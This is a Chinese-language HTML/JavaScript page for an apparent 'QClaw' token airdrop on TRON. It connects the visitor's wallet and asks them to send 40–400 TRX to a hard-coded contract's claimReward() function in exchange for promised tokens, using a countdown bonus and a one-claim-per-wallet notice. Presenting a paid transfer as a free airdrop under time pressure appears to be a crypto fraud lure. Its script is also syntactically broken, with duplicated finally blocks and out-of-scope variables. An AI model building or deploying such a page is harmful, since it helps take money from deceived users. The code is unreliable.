<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QClaw项目</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1a1a2e;
            color: #eee;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #16213e;
            border-radius: 16px;
            padding: 32px 28px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .card h1 {
            font-size: 22px;
            text-align: center;
            margin-bottom: 6px;
            color: #fff;
        }
        .subtitle {
            text-align: center;
            color: #888;
            font-size: 13px;
            margin-bottom: 10px;
        }
        .countdown-bar {
            text-align: center;
            background: #0f3460;
            border-radius: 10px;
            padding: 10px 16px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #aaa;
        }
        .countdown-bar .cd-time {
            font-size: 20px;
            font-weight: bold;
            color: #e94560;
            letter-spacing: 2px;
            margin-top: 4px;
        }
        .contract-info {
            background: #0f3460;
            border-radius: 10px;
            padding: 14px;
            margin-bottom: 20px;
            font-size: 13px;
            line-height: 1.8;
        }
        .contract-info .label { color: #888; }
        .contract-info .value { color: #4cc9f0; word-break: break-all; font-size: 12px; }
        .input-group { margin-bottom: 20px; }
        .input-group label {
            display: block;
            font-size: 13px;
            color: #aaa;
            margin-bottom: 8px;
        }
        .input-row {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .input-row input {
            flex: 1;
            background: #0f3460;
            border: 1px solid #2a4a7a;
            border-radius: 10px;
            padding: 14px 16px;
            font-size: 18px;
            color: #fff;
            outline: none;
            text-align: right;
        }
        .input-row input:focus { border-color: #4cc9f0; }
        .unit { font-size: 18px; color: #888; }
        .preview {
            background: #0f3460;
            border-radius: 10px;
            padding: 16px;
            margin-bottom: 20px;
            font-size: 14px;
            line-height: 1.9;
        }
        .preview .highlight { color: #4cc9f0; font-size: 16px; }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #e94560, #c23152);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.1s;
        }
        .btn:hover { transform: scale(1.01); }
        .btn:active { transform: scale(0.99); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status {
            margin-top: 16px;
            padding: 14px;
            border-radius: 10px;
            font-size: 13px;
            display: none;
            word-break: break-all;
            line-height: 1.6;
        }
        .status.ok { background: #0d3b2e; color: #4ade80; display: block; }
        .status.err { background: #3b0d14; color: #f87171; display: block; }
        .status.info { background: #0f3460; color: #4cc9f0; display: block; }
        .status a { color: #4cc9f0; }
    </style>
</head>
<body>
<div class="card">
    <h1>QClaw项目</h1>
    <p class="subtitle">转账 TRX 即时兑换代币</p>

    <div class="contract-info">
        <div><span class="label">合约地址：</span><span class="value">TEFCHxSzdCBS1dLzWEo6QrTT73a4yCfibT</span></div>
        <div><span class="label">基础汇率：</span>1 TRX = <strong>4</strong> QClaw</div>
        <div><span class="label">额外奖励：</span>+2 QClaw / TRX（<span id="cdInline" style="color:#e94560;">限时</span>）</div>
        <div><span class="label">我的钱包：</span><span id="walletAddr">连接中...</span></div>
    </div>

    <div class="input-group">
        <label>输入空投 TRX 数量</label>
        <div class="input-row">
            <input type="number" id="trxAmount" value="1" min="1" step="0.1" placeholder="1">
            <span class="unit">TRX</span>
        </div>
    </div>

    <div class="preview" id="preview">
        预计获得：<span class="highlight" id="tokenOut">6</span> QClaw
    </div>

    <button class="btn" id="buyBtn" onclick="buyTokens()" disabled>获取空投</button>
    <div id="onceNotice" style="display:none;text-align:center;color:#e94560;font-size:12px;margin-top:8px;">⚠️ 每个钱包地址仅可领取一次</div>

    <div class="status" id="statusBox"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
<script>
    // ── 一个月倒计时 ─────────────────────────────────────
    // 截止日期：2026年8月17日 08:00:00（+30天）
    const END_DATE = new Date('2026-08-17T00:00:00+08:00');

    function updateCountdown() {
        const now = new Date();
        const diff = END_DATE - now;
        if (diff <= 0) {
            document.getElementById('cdInline').textContent = '已结束';
            return;
        }
        const days  = Math.floor(diff / 86400000);
        const hours = Math.floor((diff % 86400000) / 3600000);
        const mins  = Math.floor((diff % 3600000) / 60000);
        const secs  = Math.floor((diff % 60000) / 1000);
        const pad = n => String(n).padStart(2, '0');
        document.getElementById('cdInline').textContent =
            pad(days) + '天' + pad(hours) + '时' + pad(mins) + '分' + pad(secs) + '后结束';
    }

    updateCountdown();
    setInterval(updateCountdown, 1000);
    // ─────────────────────────────────────────────────────

    const CONTRACT_HEX = '412ee69124a85ecee19772c71f2cc5614423e18fa5';
    const RATE = 4;
    const BONUS = 2;

    let tronWeb = null;
    let connected = false;

    async function init() {
        updatePreview();

        if (typeof TronWeb === 'undefined') {
            showStatus('err', 'TronWeb 未加载，请在 TP 钱包的 DApp 浏览器中打开此页面');
            return;
        }

        if (window.tronLink) {
            try {
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                tronWeb = window.tronWeb;
            } catch (e) {
                tronWeb = new TronWeb(
                    'https://api.trongrid.io',
                    'https://api.trongrid.io',
                    'https://api.trongrid.io'
                );
            }
        } else if (window.tronWeb) {
            tronWeb = window.tronWeb;
        } else {
            tronWeb = new TronWeb(
                'https://api.trongrid.io',
                'https://api.trongrid.io',
                'https://api.trongrid.io'
            );
        }

        try {
            const addr = tronWeb.defaultAddress.base58;
            if (addr) {
                document.getElementById('walletAddr').textContent = addr;
                connected = true;
            } else {
                document.getElementById('walletAddr').textContent = '未连接钱包';
                showStatus('info', '请在 TP 钱包的 DApp 浏览器中打开此页面，并确认 TronLink 已连接');
            }
        } catch (e) {
            document.getElementById('walletAddr').textContent = '检测中...';
            showStatus('info', '请连接钱包后重试');
        }
    }

    function updatePreview() {
        const val = parseFloat(document.getElementById('trxAmount').value) || 0;
        const tokens = Math.floor(val * (RATE + BONUS));
        document.getElementById('tokenOut').textContent = tokens.toLocaleString();
        const wallet = localStorage.getItem('qclaw_claimed_addr');
        const alreadyClaimed = !!wallet;
        document.getElementById('buyBtn').disabled = (val <= 40 || val >= 400) || alreadyClaimed;
        if (alreadyClaimed) {
            document.getElementById('buyBtn').textContent = '已领取过';
            document.getElementById('buyBtn').style.background = '#555';
            document.getElementById('onceNotice').style.display = 'block';
            document.getElementById('trxAmount').disabled = true;
        }
    }

    document.getElementById('trxAmount').addEventListener('input', updatePreview);

    async function buyTokens() {
        if (!connected || !tronWeb) {
            showStatus('err', '请先连接钱包');
            return;
        }

        const amount = parseFloat(document.getElementById('trxAmount').value);
        if (!amount || amount <= 0) {
            showStatus('err', '请输入有效的 TRX 数量');
            return;
        }

        const btn = document.getElementById('buyBtn');
        btn.disabled = true;
        btn.textContent = '处理中...';
        showStatus('info', '正在发送交易，请在新窗口确认签名...');

        try {
            const trxSun = Math.floor(amount * 1000000);

            const tx = await tronWeb.transactionBuilder.triggerSmartContract(
                CONTRACT_HEX,
                'claimReward()',
                {
                    callValue: trxSun,
                    feeLimit: 100_000_000
                },
                [],
                tronWeb.defaultAddress.hex
            );

            const signedTx = await tronWeb.trx.sign(tx.transaction);
            const result = await tronWeb.trx.sendRawTransaction(signedTx);

            if (result.result) {
                showStatus('ok',
                    '获取成功！<br>' +
                    'TxID: ' + result.txid + '<br>' +
                    '<a href="https://tronscan.org/#/transaction/' + result.txid + '" target="_blank">在 TronScan 查看</a>'
                );
            } else {
                showStatus('err', '交易失败: ' + JSON.stringify(result));
            }
        } catch (err) {
            let msg = err.message || String(err);
            msg = msg.replace(/at async.*$/gm, '').trim();
            if (msg.length > 300) msg = msg.substring(0, 300) + '...';
            showStatus('err', '错误: ' + msg);
        } finally {
            btn.disabled = false;
            btn.textContent = '获取空投';
        } finally {
            // 成功后标记该地址已领取
            if (result.result) {
                const addr = tronWeb.defaultAddress.base58;
                localStorage.setItem('qclaw_claimed_addr', addr);
                document.getElementById('buyBtn').textContent = '已领取';
                document.getElementById('buyBtn').style.background = '#555';
                document.getElementById('buyBtn').disabled = true;
                document.getElementById('onceNotice').style.display = 'block';
                document.getElementById('trxAmount').disabled = true;
        }
    }

    function showStatus(type, msg) {
        const el = document.getElementById('statusBox');
        el.className = 'status ' + type;
        el.innerHTML = msg;
        el.style.display = 'block';
    }

    init();
</script>
</body>
</html>
